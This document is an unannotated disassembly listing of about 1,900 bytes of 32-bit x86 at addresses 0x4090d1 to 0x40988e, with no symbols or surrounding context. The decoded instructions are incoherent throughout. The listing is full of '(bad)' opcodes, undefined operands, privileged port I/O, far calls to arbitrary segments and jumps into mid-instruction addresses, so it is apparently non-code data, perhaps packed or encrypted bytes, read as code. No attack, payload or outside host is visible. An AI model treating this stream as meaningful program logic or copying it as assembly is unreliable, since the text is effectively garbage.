  4090d1:	dec    esp
  4090d2:	sar    DWORD PTR [edi+eax*1],cl
  4090d5:	(bad)  
  4090d6:	pusha  
  4090d7:	stos   DWORD PTR es:[edi],eax
  4090d8:	fnstcw WORD PTR [edi-0x63]
  4090db:	icebp  
  4090dc:	mov    al,ah
  4090de:	xor    eax,0x60
  4090e1:	fcmovnbe st,st(7)
  4090e3:	ret    0x637
  4090e6:	sbb    edi,DWORD PTR [ecx-0xd]
  4090e9:	mov    ebx,0x98402cd3
  4090ee:	xchg   ecx,eax
  4090ef:	fst    st(4)
  4090f1:	xchg   ebx,eax
  4090f2:	fwait
  4090f3:	test   BYTE PTR [edx+0x1d779a63],bl
  4090f9:	push   ds
  4090fa:	jno    0x4090b0
  4090fc:	imul   esp,DWORD PTR [ebp+0x3c67addf],0xffffffc6
  409103:	outs   dx,DWORD PTR ds:[esi]
  409104:	fcmove st,st(5)
  409106:	(bad)  
  409107:	mov    dh,0x7d
  409109:	pop    edx
  40910a:	or     eax,0x4db3cb7e
  40910f:	cmp    eax,0x22eff8d1
  409114:	neg    BYTE PTR [ebx-0x44]
  409117:	in     eax,dx
  409118:	repnz loopne 0x4090ac
  40911b:	(bad)  
  40911c:	loopne 0x409194
  40911e:	(bad)  
  409121:	and    DWORD PTR [ecx-0x7c325221],0x9a518999
  40912b:	jno    0x40917b
  40912d:	cli    
  40912e:	pusha  
  40912f:	clc    
  409130:	les    eax,FWORD PTR [edx-0x24236a18]
  409136:	rol    cl,cl
  409138:	mov    ebp,0x2a263868
  40913d:	pop    ds
  40913e:	out    dx,al
  40913f:	xchg   edx,eax
  409140:	out    0x93,eax
  409142:	or     bl,BYTE PTR [eax-0x62]
  409145:	xor    bh,al
  409147:	xchg   esp,eax
  409148:	inc    ebx
  409149:	js     0x4091b6
  40914b:	ja     0x409165
  40914d:	imul   ecx,DWORD PTR [edx+0x40],0x5a311c7c
  409154:	pop    esp
  409155:	and    DWORD PTR [ecx+0x4e9a5155],eax
  40915b:	xor    eax,0xe459093e
  409160:	loope  0x40917a
  409162:	mov    bl,0x48
  409164:	fsubr  DWORD PTR [ebx+eiz*4]
  409167:	sar    DWORD PTR [edx+0x74],cl
  40916a:	shl    bl,0xa2
  40916d:	mov    al,0x3c
  40916f:	push   edi
  409170:	xlat   BYTE PTR ss:[ebx]
  409172:	jnp    0x409197
  409174:	push   edx
  409175:	into   
  409176:	inc    eax
  409177:	loop   0x409179
  409179:	ins    BYTE PTR es:[edi],dx
  40917a:	push   eax
  40917b:	add    cl,dh
  40917d:	push   ecx
  40917e:	popf   
  40917f:	jb     0x409181
  409181:	ud0    esi,DWORD PTR [esi+edx*8+0x58aa8c05]
  409189:	leave  
  40918a:	xor    al,BYTE PTR [eax+0x5d5c1d9a]
  409190:	popa   
  409191:	shl    BYTE PTR [edi-0x47],1
  409194:	adc    eax,0x5af27037
  409199:	ja     0x409162
  40919b:	fldenv [ebp+0x5f307372]
  4091a1:	popa   
  4091a2:	push   edx
  4091a3:	push   ebp
  4091a4:	xchg   edi,eax
  4091a5:	and    cl,BYTE PTR [ecx+0x29f96980]
  4091ab:	push   ss
  4091ac:	adc    edi,DWORD PTR [esi+0x5db2a86d]
  4091b2:	adc    edx,esp
  4091b4:	mov    edi,0xaafa522a
  4091b9:	cli    
  4091ba:	leave  
  4091bb:	pushf  
  4091bc:	je     0x409146
  4091be:	dec    edi
  4091bf:	lods   eax,DWORD PTR ds:[esi]
  4091c0:	add    bl,BYTE PTR [eax+0x3452940e]
  4091c6:	clc    
  4091c7:	dec    eax
  4091c8:	sbb    ebx,DWORD PTR [ecx]
  4091ca:	and    eax,0x2291f6b5
  4091cf:	xchg   ecx,eax
  4091d0:	xor    esi,ebp
  4091d2:	lods   eax,DWORD PTR ds:[esi]
  4091d3:	xor    ebp,ebx
  4091d5:	dec    eax
  4091d6:	inc    ebp
  4091d7:	lods   eax,DWORD PTR ds:[esi]
  4091d8:	add    al,0x6d
  4091da:	dec    ebx
  4091db:	inc    edi
  4091dc:	mov    dl,0x99
  4091de:	or     ebx,eax
  4091e0:	cdq    
  4091e1:	(bad)  
  4091e2:	lods   al,BYTE PTR ds:[esi]
  4091e3:	xchg   ecx,eax
  4091e4:	add    DWORD PTR [edx+0x1d3f2930],esi
  4091ea:	push   edx
  4091eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ec:	and    esi,ebp
  4091ee:	ss pop esi
  4091f0:	cmp    al,0x63
  4091f2:	pop    es
  4091f3:	adc    ch,BYTE PTR [edi+ebx*4+0x659b28d2]
  4091fa:	sahf   
  4091fb:	mov    ebp,eax
  4091fd:	xchg   ecx,eax
  4091fe:	aaa    
  4091ff:	repnz push eax
  409201:	test   eax,0x42b8b24b
  409206:	mov    ebx,0x9628092e
  40920b:	push   ebx
  40920c:	rol    DWORD PTR [ecx],0x59
  40920f:	mov    dl,0x2d
  409211:	cmp    DWORD PTR fs:[eax+0x61580516],esi
  409218:	cdq    
  409219:	push   ds
  40921a:	(bad)  
  40921b:	pop    es
  40921c:	iret   
  40921d:	out    0x6a,eax
  40921f:	mov    edi,0x2f29bc22
  409224:	xor    ecx,DWORD PTR [esi-0x50]
  409227:	xchg   esi,eax
  409228:	and    al,0xe7
  40922a:	fdiv   DWORD PTR [ebx-0x5fbc4279]
  409230:	jl     0x4091bf
  409232:	(bad)  
  409233:	pop    ds
  409234:	cmp    cl,BYTE PTR [edi-0x166bb58]
  40923a:	test   BYTE PTR [ecx],dl
  40923c:	ret    0xeefa
  40923f:	pop    es
  409240:	mov    edi,0x3e048a00
  409245:	int3   
  409246:	or     BYTE PTR [ecx],0x1b
  409249:	jmp    0x4092b3
  40924b:	repz cmp eax,0x871c79e
  409251:	into   
  409252:	repnz popa 
  409254:	add    edi,DWORD PTR [ebp-0x2c]
  409257:	inc    eax
  409258:	pusha  
  409259:	push   eax
  40925a:	mov    ?,WORD PTR [eax+ecx*4-0x45]
  40925e:	aad    0x50
  409260:	in     eax,dx
  409261:	aam    0x21
  409263:	push   0xc838abbf
  409268:	xchg   edi,eax
  409269:	mov    ecx,0x49417860
  40926e:	jp     0x409291
  409270:	push   ecx
  409271:	stos   DWORD PTR es:[edi],eax
  409272:	aaa    
  409273:	cmp    esp,DWORD PTR [edi+0x77695b16]
  409279:	scas   al,BYTE PTR es:[edi]
  40927a:	pop    edi
  40927b:	mov    esp,0x7d0c9ebf
  409280:	mov    DWORD PTR [edx],esi
  409282:	inc    eax
  409283:	call   0xd031:0xe4b2386e
  40928a:	adc    esp,0xffffffd9
  40928d:	jmp    0x82fe:0xe05c9f3d
  409294:	inc    edi
  409295:	test   esi,edx
  409297:	dec    esp
  409298:	out    dx,al
  409299:	adc    BYTE PTR [ebx-0x127a0ca0],al
  40929f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092a0:	clc    
  4092a1:	outs   dx,BYTE PTR ds:[esi]
  4092a2:	ja     0x40926c
  4092a4:	fwait
  4092a5:	int3   
  4092a6:	cmp    cl,BYTE PTR [ecx+eiz*2]
  4092a9:	into   
  4092aa:	(bad)  
  4092ac:	mov    edx,0x370dfcc4
  4092b1:	in     eax,dx
  4092b2:	clc    
  4092b3:	or     eax,DWORD PTR [ebx]
  4092b5:	mov    ebx,0xee69d25
  4092ba:	scas   eax,DWORD PTR es:[edi]
  4092bb:	scas   al,BYTE PTR es:[edi]
  4092bc:	jo     0x40930e
  4092be:	enter  0x332,0xde
  4092c2:	in     al,dx
  4092c3:	sub    al,0x75
  4092c5:	xlat   BYTE PTR ds:[ebx]
  4092c6:	push   es
  4092c7:	and    esi,DWORD PTR [edx-0x65]
  4092ca:	ficomp WORD PTR [ecx+0x1a]
  4092cd:	xchg   ecx,eax
  4092ce:	loopne 0x409264
  4092d0:	adc    ch,BYTE PTR [edi+0x1f]
  4092d3:	pop    DWORD PTR [eax-0x34474613]
  4092d9:	mov    ebp,0xb83133a8
  4092de:	out    dx,eax
  4092df:	iret   
  4092e0:	imul   ebx,ebx,0xffffff8e
  4092e3:	add    eax,0xda0d7490
  4092e8:	leave  
  4092e9:	cmp    eax,0x8170e5c3
  4092ee:	or     al,0x60
  4092f0:	repz test DWORD PTR [ebx],0x273e471
  4092f7:	test   BYTE PTR [ecx+eax*1],0xe0
  4092fb:	mov    esi,0x2940d482
  409300:	stos   DWORD PTR es:[edi],eax
  409301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409302:	jp     0x4092cd
  409304:	or     DWORD PTR [ebx-0x1c],eax
  409307:	sub    eax,0x68e2b19f
  40930c:	test   eax,0x68b19457
  409311:	push   0x6b044838
  409316:	push   0x8fd6b09c
  40931b:	lahf   
  40931c:	jmp    0xaddb5985
  409321:	pop    ebp
  409322:	dec    ebp
  409323:	fwait
  409324:	mov    ds:0x69a7ef77,eax
  409329:	loopne 0x409307
  40932b:	shl    DWORD PTR [eax+0x5c],0xbf
  40932f:	or     al,0xb
  409331:	push   es
  409332:	enter  0x6189,0xf5
  409336:	sbb    BYTE PTR [edi-0x21],bl
  409339:	imul   eax,DWORD PTR [ebx+edi*8-0x9],0x43a33e92
  409341:	jo     0x4093c2
  409343:	leave  
  409344:	dec    esi
  409345:	bound  ebx,QWORD PTR [edi-0xbb6a525]
  40934b:	cmp    edx,DWORD PTR [ecx*1+0x5a1a1dc4]
  409352:	jge    0x409323
  409354:	inc    ebx
  409355:	shl    BYTE PTR [esi],cl
  409357:	stos   DWORD PTR es:[edi],eax
  409358:	push   es
  409359:	dec    eax
  40935a:	lea    ebp,[esi+0x2e]
  40935d:	hlt    
  40935e:	xchg   edx,eax
  40935f:	dec    esi
  409360:	or     BYTE PTR [edi-0x3e],0xfa
  409364:	jne    0x4092e6
  409366:	fwait
  409367:	aaa    
  409368:	jecxz  0x4093e4
  40936a:	push   ss
  40936b:	inc    esi
  40936c:	jmp    0x4092ef
  40936e:	cdq    
  40936f:	jmp    0x8b57:0x490e8805
  409376:	dec    ecx
  409377:	ss jge 0x4093a8
  40937a:	dec    ebp
  40937b:	jecxz  0x40939a
  40937d:	stos   DWORD PTR es:[edi],eax
  40937e:	out    dx,al
  40937f:	es pop esi
  409381:	(bad)  
  409382:	mov    bl,0x2c
  409384:	daa    
  409385:	stos   BYTE PTR es:[edi],al
  409386:	js     0x4093b9
  409388:	mov    ds:0xe9187b6c,eax
  40938d:	(bad)  [edx+0x1b]
  409390:	jecxz  0x4093c9
  409392:	pop    eax
  409393:	sbb    eax,0x924a135f
  409398:	iret   
  409399:	push   ebp
  40939a:	in     al,dx
  40939b:	pop    ebp
  40939c:	imul   edx,DWORD PTR [bp+si-0x32],0xc6d3c3ed
  4093a4:	mov    al,0xd7
  4093a6:	jecxz  0x4093f8
  4093a8:	hlt    
  4093a9:	ror    DWORD PTR [ebx-0x6758be88],cl
  4093af:	lods   al,BYTE PTR ds:[esi]
  4093b0:	xchg   edx,eax
  4093b1:	imul   ecx,DWORD PTR [esi],0x72ff0607
  4093b7:	xchg   esi,eax
  4093b8:	out    0xdf,eax
  4093ba:	dec    esi
  4093bb:	push   ss
  4093bc:	push   esi
  4093bd:	add    esi,DWORD PTR [edx-0x1fe3427]
  4093c3:	cmp    al,0x6f
  4093c5:	mov    cs,WORD PTR [ebx]
  4093c7:	fild   DWORD PTR [esi+0x70]
  4093ca:	cld    
  4093cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093cc:	mov    cl,0x94
  4093ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093cf:	cs jmp 0x8020:0x48b7e9b7
  4093d7:	sub    al,0x42
  4093d9:	jae    0x4093da
  4093db:	mov    cs,WORD PTR ds:0x211953b6
  4093e1:	add    DWORD PTR [eax+0xe1caf05],eax
  4093e7:	fwait
  4093e8:	or     BYTE PTR [ecx+edi*8],al
  4093eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ec:	cmp    ah,bl
  4093ee:	dec    ebx
  4093ef:	popf   
  4093f0:	aas    
  4093f1:	popf   
  4093f2:	jg     0x40945e
  4093f4:	jecxz  0x4093a1
  4093f6:	xor    DWORD PTR [edi+edx*8-0xb],ebx
  4093fa:	fld    TBYTE PTR [ebx]
  4093fc:	add    al,0xa6
  4093ff:	daa    
  409400:	ret    0xf1e3
  409403:	jl     0x409410
  409405:	mov    ds:0xe8c8f87b,al
  40940a:	xchg   ecx,eax
  40940b:	pusha  
  40940c:	push   ebx
  40940d:	(bad)  
  40940f:	lods   al,BYTE PTR ds:[esi]
  409410:	cmp    BYTE PTR [ecx],al
  409412:	xor    dl,BYTE PTR [edi-0x14]
  409415:	push   edi
  409416:	loopne 0x40943a
  409418:	sbb    eax,0x64722076
  40941d:	ds nop
  40941f:	shr    BYTE PTR ds:0x897719a4,cl
  409425:	cmc    
  409426:	push   ds
  409427:	push   eax
  409428:	repz pop ecx
  40942a:	or     edx,DWORD PTR [eax]
  40942c:	in     eax,dx
  40942d:	fadd   DWORD PTR [esi-0x7d]
  409430:	(bad)  
  409432:	imul   DWORD PTR [edx-0x1562fa59]
  409438:	cmp    al,0x99
  40943a:	fcomp  QWORD PTR [eax-0x6b]
  40943d:	clc    
  40943e:	mov    edx,0x15b7a6e0
  409443:	lds    esp,FWORD PTR [ebx+ebp*2+0x3e]
  409447:	std    
  409448:	call   0xf4ca93e7
  40944d:	hlt    
  40944e:	cmp    ebx,DWORD PTR [eax]
  409450:	dec    ecx
  409451:	bnd jp 0x409497
  409454:	cmp    esp,eax
  409456:	or     ebp,DWORD PTR [ecx-0x2e]
  409459:	and    cl,BYTE PTR [ecx-0x72]
  40945c:	mov    ebp,0x3d85c37a
  409461:	fistp  QWORD PTR [ecx]
  409463:	lahf   
  409464:	mov    ch,BYTE PTR [edx+0x34]
  409467:	sub    esp,DWORD PTR [esi-0x11d0d130]
  40946d:	pop    esi
  40946e:	and    ebp,DWORD PTR [edx-0x6f8ba91]
  409474:	ficom  DWORD PTR [esi-0x65]
  409477:	bound  eax,QWORD PTR [esi-0x40]
  40947a:	xchg   ebp,eax
  40947b:	push   edx
  40947c:	jnp    0x409467
  40947e:	sub    al,0x0
  409480:	xchg   edx,eax
  409481:	or     al,0x37
  409483:	adc    DWORD PTR [ebp-0x16d3a82a],esp
  409489:	cmp    DWORD PTR [esi+0x6f0e0e65],edx
  40948f:	xchg   ebx,eax
  409490:	add    al,0x8e
  409492:	adc    edi,edi
  409494:	dec    edi
  409495:	or     cl,cl
  409497:	push   ebp
  409498:	adc    bl,bh
  40949a:	mov    ch,0x63
  40949c:	cld    
  40949d:	repz sub cl,BYTE PTR [edi]
  4094a0:	imul   eax,DWORD PTR [esi+eiz*1-0x78d3dd1b],0xd593f11c
  4094ab:	cmp    al,0x6c
  4094ad:	inc    eax
  4094ae:	mov    eax,ds:0x31a3d283
  4094b3:	(bad)  
  4094b6:	imul   ebx,DWORD PTR [edx+0x195f122b],0xacd62a51
  4094c0:	jle    0x409522
  4094c2:	push   0x48e2e06b
  4094c7:	xor    al,0x8e
  4094c9:	daa    
  4094ca:	mov    esp,esp
  4094cc:	test   BYTE PTR [ecx],bh
  4094ce:	pop    ds
  4094cf:	ja     0x4094de
  4094d1:	fwait
  4094d2:	xor    DWORD PTR [ecx+0x17fa743a],ebx
  4094d8:	xadd   BYTE PTR [edi+0x40ba550a],ch
  4094df:	out    0xa2,eax
  4094e1:	xor    BYTE PTR [ebp-0x56],dl
  4094e4:	popa   
  4094e5:	arpl   WORD PTR [edi+0x30],si
  4094e8:	inc    edx
  4094e9:	or     bh,BYTE PTR [ecx]
  4094eb:	mov    eax,0x8d37a138
  4094f0:	stos   DWORD PTR es:[edi],eax
  4094f1:	aaa    
  4094f2:	xor    BYTE PTR [eax+ebx*8],bl
  4094f5:	push   0x60
  4094f7:	push   ebp
  4094f8:	mov    al,0x47
  4094fa:	test   BYTE PTR [esi+0x4a],bl
  4094fd:	lahf   
  4094fe:	loop   0x409563
  409500:	lods   al,BYTE PTR ds:[esi]
  409501:	mov    eax,ds:0x8e2b3fad
  409506:	lods   eax,DWORD PTR es:[esi]
  409508:	lar    eax,si
  40950b:	xchg   edi,eax
  40950c:	mov    edi,0xee87e716
  409511:	jae    0x409579
  409513:	lds    esp,FWORD PTR [edx+0x0]
  409516:	js     0x409510
  409518:	mov    ds:0xe847ba47,eax
  40951d:	add    DWORD PTR [ebx-0x2a],eax
  409520:	stos   BYTE PTR es:[edi],al
  409521:	xchg   bh,ch
  409523:	add    ah,dh
  409525:	xor    al,0x44
  409527:	cdq    
  409528:	inc    esi
  409529:	call   0x8a42:0x859be9cd
  409530:	pop    eax
  409531:	nop
  409532:	mov    ?,WORD PTR [ebp-0x67]
  409535:	mov    esi,0xd5f3eb70
  40953a:	(bad)  
  40953b:	ja     0x409544
  40953d:	out    0x1a,al
  40953f:	cmp    edx,DWORD PTR [esi-0x2b278f16]
  409545:	mov    dh,0x60
  409547:	jae    0x40956b
  409549:	aas    
  40954a:	ficomp DWORD PTR [edi-0x76c8325d]
  409550:	pop    es
  409551:	dec    esi
  409552:	shr    BYTE PTR [ecx-0x74332fe1],0xe6
  409559:	or     al,0x78
  40955b:	(bad)  
  40955c:	int3   
  40955d:	push   eax
  40955e:	shl    BYTE PTR [edx],cl
  409560:	cmp    eax,0xab71292
  409565:	pop    edi
  409566:	jnp    0x40955c
  409568:	pop    edi
  409569:	(bad)  
  40956a:	xor    eax,0x94bb9d35
  40956f:	in     al,0xa8
  409571:	dec    ebp
  409572:	fyl2x  
  409574:	mov    dh,0x12
  409576:	je     0x409555
  409578:	adc    ebx,DWORD PTR [ebp+0x6d6d830b]
  40957e:	pushf  
  40957f:	ja     0x409520
  409581:	adc    eax,DWORD PTR ds:0xa602bdf2
  409587:	or     eax,DWORD PTR [edx]
  409589:	(bad)  
  40958a:	xchg   ebx,eax
  40958b:	(bad)  
  40958c:	hlt    
  40958d:	jmp    0x9683e3a0
  409592:	sub    eax,0xcece6452
  409597:	stc    
  409598:	into   
  409599:	scas   al,BYTE PTR es:[edi]
  40959a:	add    ch,BYTE PTR ss:[eax]
  40959d:	shl    BYTE PTR [eax-0x57],cl
  4095a0:	push   ebx
  4095a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a2:	mov    DWORD PTR [eax],eax
  4095a4:	and    al,cl
  4095a6:	inc    edi
  4095a7:	xchg   ebx,eax
  4095a8:	xor    al,0xdd
  4095aa:	jne    0x409534
  4095ac:	out    0xde,al
  4095ae:	retf   0x68d0
  4095b1:	sub    BYTE PTR [edx+edi*4-0x37],dh
  4095b5:	dec    ebp
  4095b6:	pop    esi
  4095b7:	loop   0x40956c
  4095b9:	data16 jecxz 0x4095ac
  4095bc:	iret   
  4095bd:	out    dx,eax
  4095be:	mov    ds:0xa2750675,al
  4095c3:	(bad)  [ecx+0x7b]
  4095c6:	push   cs
  4095c7:	int3   
  4095c8:	dec    ecx
  4095c9:	xchg   edi,eax
  4095ca:	adc    al,0xaf
  4095cc:	call   0xdef7:0xfabe8623
  4095d3:	sbb    eax,DWORD PTR [edi]
  4095d5:	inc    edx
  4095d6:	sbb    BYTE PTR [ebx],bh
  4095d8:	outs   dx,BYTE PTR ds:[esi]
  4095d9:	jl     0x409659
  4095db:	adc    BYTE PTR [ebx-0x68],cl
  4095de:	adc    DWORD PTR [eax+0x1825b8cc],ecx
  4095e4:	mov    edx,edx
  4095e6:	sbb    DWORD PTR [edx],esi
  4095e8:	mov    ebp,0x1d95677d
  4095ed:	xchg   ebx,eax
  4095ee:	retf   
  4095ef:	xor    DWORD PTR [ebx+esi*4],ebp
  4095f2:	int3   
  4095f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095f5:	mov    ebx,0xe0270c3f
  4095fa:	and    bh,BYTE PTR [ebp-0x3d94cf69]
  409600:	retf   0x5f1d
  409603:	aaa    
  409604:	cdq    
  409605:	nop
  409606:	mov    eax,edi
  409608:	cmp    eax,esi
  40960a:	jae    0x409644
  40960c:	fdivr  DWORD PTR [edx-0x3733d32]
  409612:	test   BYTE PTR [esi],bl
  409614:	lds    ecx,FWORD PTR [ebp-0x344b4215]
  40961a:	push   edi
  40961b:	sti    
  40961c:	push   ebp
  40961d:	sbb    eax,0xeb684be0
  409622:	xor    bh,ah
  409624:	mov    eax,ds:0xd8974374
  409629:	mov    ebp,0x46ebdae7
  40962e:	xor    DWORD PTR [esi],0xffffffcf
  409631:	popa   
  409632:	enter  0xcf2f,0xdb
  409636:	ins    BYTE PTR es:[edi],dx
  409637:	aad    0x72
  409639:	in     al,0x19
  40963b:	mov    eax,0x68af2010
  409640:	mov    al,0x9
  409642:	js     0x40967d
  409644:	mov    WORD PTR [ebx],ds
  409646:	push   esi
  409647:	aam    0x3b
  409649:	pop    edx
  40964a:	leave  
  40964b:	pushf  
  40964c:	push   cs
  40964d:	cli    
  40964e:	inc    eax
  40964f:	fisttp QWORD PTR [ebp+0x39]
  409652:	and    DWORD PTR [edi-0x79],0x3c0af8d8
  409659:	in     al,dx
  40965a:	xchg   DWORD PTR [ecx+0x17ebb07a],ecx
  409660:	ds popa 
  409662:	mov    bl,0x99
  409664:	or     BYTE PTR [eax+0x4a0d1e51],cl
  40966a:	sbb    ebx,DWORD PTR [ecx+0x25]
  40966d:	outs   dx,BYTE PTR ds:[esi]
  40966e:	xchg   BYTE PTR [edx-0x465aceed],al
  409674:	pop    ds
  409675:	bound  esi,QWORD PTR [edx+0x56]
  409678:	push   eax
  409679:	sbb    ebx,0x58
  40967c:	ficomp DWORD PTR [edi+0x1a]
  40967f:	in     eax,dx
  409680:	ficom  WORD PTR [eax+0x52]
  409683:	xchg   edi,eax
  409684:	xchg   esp,eax
  409685:	sbb    ah,al
  409687:	push   ss
  409688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409689:	(bad)  
  40968a:	outs   dx,DWORD PTR ds:[esi]
  40968b:	test   BYTE PTR [ecx+0x0],ch
  40968e:	xchg   ebp,eax
  40968f:	nop
  409690:	hlt    
  409691:	jl     0x40967f
  409693:	add    al,0x18
  409695:	adc    eax,0xaeb94219
  40969a:	loopne 0x409643
  40969c:	add    eax,0x17dc489a
  4096a1:	repnz jmp 0xdc96:0x238c77f9
  4096a9:	aas    
  4096aa:	jae    0x409633
  4096ac:	push   ecx
  4096ad:	sti    
  4096ae:	dec    ecx
  4096af:	cmp    DWORD PTR [ecx],esi
  4096b1:	cdq    
  4096b2:	jo     0x40970b
  4096b4:	pop    ebp
  4096b5:	daa    
  4096b6:	push   es
  4096b7:	repz and eax,0x5eb0f856
  4096bd:	cmp    eax,0xcc027ae4
  4096c2:	addr16 dec eax
  4096c4:	push   ecx
  4096c5:	mov    eax,ds:0x7c58ace4
  4096ca:	lock stos DWORD PTR es:[edi],eax
  4096cc:	or     BYTE PTR [ebx-0x3a730d4c],ch
  4096d2:	pop    ds
  4096d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096d4:	in     eax,0x50
  4096d6:	sub    BYTE PTR [edx+ebx*1],0xaa
  4096da:	inc    edx
  4096db:	adc    edx,ebx
  4096dd:	mov    esi,0xd96dff4c
  4096e2:	pop    edx
  4096e3:	pop    esi
  4096e4:	push   ds
  4096e5:	push   ds
  4096e6:	or     BYTE PTR [edx-0x649ad724],ch
  4096ec:	leave  
  4096ed:	cmp    al,0x92
  4096ef:	ret    0xfb04
  4096f2:	and    dh,ch
  4096f4:	and    DWORD PTR [edx+0x74],ecx
  4096f7:	mov    DWORD PTR [eax-0x61],esi
  4096fa:	and    BYTE PTR [edi],ah
  4096fc:	dec    ecx
  4096fd:	add    edi,DWORD PTR [ecx+0x68]
  409700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409701:	leave  
  409702:	or     cl,BYTE PTR [ecx-0x46]
  409705:	xor    DWORD PTR [esp+edi*1],edi
  409708:	jbe    0x409717
  40970a:	cmp    BYTE PTR [edi],0x9a
  40970d:	mov    al,0xf
  40970f:	les    ecx,FWORD PTR [ebp+0x76]
  409712:	lods   ax,WORD PTR ds:[esi]
  409714:	es mov ecx,0xd189a522
  40971a:	jnp    0x40969e
  40971c:	in     al,dx
  40971d:	(bad)  
  40971e:	push   edi
  40971f:	in     al,0x75
  409721:	sub    ebx,DWORD PTR [eax]
  409723:	arpl   sp,di
  409725:	push   ds
  409726:	adc    eax,0xfcf98d73
  40972b:	inc    esi
  40972c:	mov    ds,WORD PTR [eax+0x7894a0b9]
  409732:	mov    dl,0xc1
  409734:	test   eax,0x773a9b2e
  409739:	pusha  
  40973a:	xchg   edi,eax
  40973b:	adc    ah,ah
  40973d:	push   eax
  40973e:	xlat   BYTE PTR ds:[ebx]
  40973f:	fild   WORD PTR [eax+0x39374d29]
  409745:	fmul   st,st(0)
  409747:	cs repnz aas 
  40974a:	adc    eax,0xf54aec68
  40974f:	in     al,dx
  409750:	fdivr  QWORD PTR [edx+eax*1]
  409753:	add    DWORD PTR [eax+0x67],ebp
  409756:	xchg   ebx,eax
  409757:	or     ebp,DWORD PTR [eax-0x5aed86dd]
  40975d:	test   DWORD PTR [edx],0x1829e829
  409763:	mov    ebx,esi
  409765:	sbb    BYTE PTR [edi+0x518b86c5],ah
  40976b:	xchg   ecx,eax
  40976c:	push   ds
  40976d:	arpl   di,bp
  40976f:	jo     0x40972d
  409771:	jge    0x40970f
  409773:	lahf   
  409774:	xchg   BYTE PTR [eax],ch
  409776:	std    
  409777:	jecxz  0x40971a
  409779:	jp     0x409779
  40977b:	mov    esp,edi
  40977d:	jl     0x4097e8
  40977f:	inc    edx
  409780:	xchg   ebp,eax
  409781:	xchg   esi,eax
  409782:	outs   dx,DWORD PTR ds:[esi]
  409783:	add    al,0x46
  409785:	inc    ebp
  409786:	or     eax,0xc2d6f191
  40978b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40978c:	jmp    0x4097ed
  40978e:	div    ch
  409790:	pop    es
  409791:	jle    0x4097df
  409793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409795:	mov    al,ds:0x326182b7
  40979a:	inc    ecx
  40979b:	push   ebx
  40979c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40979e:	push   ds
  40979f:	or     dl,BYTE PTR [eax-0xaeda9d3]
  4097a5:	pop    esp
  4097a6:	sahf   
  4097a7:	xchg   edx,eax
  4097a8:	cwde   
  4097a9:	sbb    eax,0x87c9b3e3
  4097ae:	pop    eax
  4097af:	call   0xc027:0xb12089a3
  4097b6:	not    BYTE PTR [ebx+0x25]
  4097b9:	cwde   
  4097ba:	mov    ds:0xf69dfe7f,eax
  4097bf:	dec    edx
  4097c0:	push   esi
  4097c1:	xor    bh,0x40
  4097c4:	or     bh,BYTE PTR [edx-0x1c]
  4097c7:	inc    edx
  4097c8:	cli    
  4097c9:	and    dl,ch
  4097cb:	and    cl,BYTE PTR [eax+0x3b]
  4097ce:	cdq    
  4097cf:	mov    al,ds:0x169b35c7
  4097d4:	xchg   edx,eax
  4097d5:	pop    ds
  4097d6:	sahf   
  4097d7:	xor    ch,BYTE PTR ds:0xd92e6c90
  4097dd:	call   0x58dcdeb7
  4097e2:	or     bh,BYTE PTR [esi]
  4097e4:	jbe    0x409819
  4097e6:	out    0x23,eax
  4097e8:	xchg   ecx,eax
  4097e9:	scas   eax,DWORD PTR es:[edi]
  4097ea:	lds    esp,FWORD PTR [ebx+0x6f]
  4097ed:	and    ebp,DWORD PTR [edx+eiz*1]
  4097f0:	ret    
  4097f1:	push   ecx
  4097f2:	add    dl,bh
  4097f4:	(bad)  
  4097f5:	mov    ds:0x7143ec17,al
  4097fa:	mov    ecx,0x74c81e8c
  4097ff:	cdq    
  409800:	xchg   BYTE PTR [eax-0x3884e9c0],al
  409806:	mov    dh,0xce
  409808:	jae    0x4097a4
  40980a:	gs aas 
  40980c:	call   0xad1e:0x24e6b6c2
  409813:	pusha  
  409814:	pop    ebx
  409815:	xor    al,0x8
  409817:	xchg   BYTE PTR [esi+0x6679945d],ah
  40981d:	and    eax,0xc6860937
  409822:	inc    ebp
  409823:	mov    ds:0x5f3849f1,al
  409828:	test   DWORD PTR [edi],0x1da4060c
  40982e:	das    
  40982f:	push   0x35a59bf5
  409834:	adc    al,0xc8
  409836:	xchg   edx,eax
  409837:	lock arpl WORD PTR [edi+0x2fc2524a],ax
  40983e:	adc    DWORD PTR [eax],ebx
  409840:	pop    eax
  409841:	jno    0x409840
  409843:	adc    ecx,esp
  409845:	ja     0x40987d
  409847:	mov    DWORD PTR [eax-0x23],ebp
  40984a:	cdq    
  40984b:	mov    bl,0xe9
  40984d:	stos   DWORD PTR es:[edi],eax
  40984e:	and    al,0xd6
  409850:	jmp    0x4097ff
  409852:	cmp    al,0x90
  409854:	or     al,0xbc
  409856:	mov    DWORD PTR [ecx+0x66],esi
  409859:	call   0xd0c0af68
  40985e:	dec    esp
  40985f:	imul   esi,edi,0x4a
  409862:	fiadd  WORD PTR [ebx+edi*4-0x30a50f9b]
  409869:	in     al,0x33
  40986b:	jl     0x4098a2
  40986d:	retf   
  40986e:	add    dl,BYTE PTR [ebp*1+0x556c4e8f]
  409875:	add    eax,DWORD PTR [ebx]
  409877:	(bad)  
  409878:	fisttp QWORD PTR [ebp+0x65]
  40987b:	repz dec ebx
  40987d:	(bad)  
  40987e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40987f:	mov    eax,0x48df7a17
  409884:	in     al,dx
  409885:	popf   
  409886:	xor    BYTE PTR [ecx+0x34ef0128],dh
  40988c:	sbb    al,0xaa
  40988e:	test   DWORD PTR [ebp-0x4ff34492],edi
